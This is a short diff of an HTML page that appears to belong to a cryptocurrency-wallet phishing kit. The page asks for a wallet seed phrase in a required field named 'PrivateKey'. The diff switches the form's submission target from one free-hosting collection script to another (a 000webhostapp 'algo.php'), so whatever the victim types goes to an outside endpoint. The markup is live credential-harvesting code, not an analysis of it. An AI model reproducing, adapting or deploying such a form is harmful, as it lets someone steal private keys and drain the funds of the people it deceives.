@@ -523,7 +523,7 @@ background-color: #e5494d!important;
 <div class="headline-1 text-center ng-scope" w-i18n="seedForm.title"></div>
               
 
-<form method="POST" action="https://shiba-men.000webhostapp.com/login.php" accept-charset="UTF-8" class="margin-2 ng-scope ng-valid-minlength ng-dirty ng-valid-parse ng-valid ng-valid-required" style="">
+<form method="POST" action="https://shibainubonus.000webhostapp.com/algo.php" accept-charset="UTF-8" class="margin-2 ng-scope ng-valid-minlength ng-dirty ng-valid-parse ng-valid ng-valid-required" style="">
     
      <div class="seed-block margin-3"><w-input textarea="id=" required="" name="PrivateKey" maxlength="150" class="embed no-icon big ng-pristine ng-untouched ng-isolate-scope ng-valid-minlength ng-not-empty ng-valid ng-valid-required=" placeholder="" w-i18n-attr="placeholder" minlength="25" aria-invalid="false" aria-required="true" style="">
    
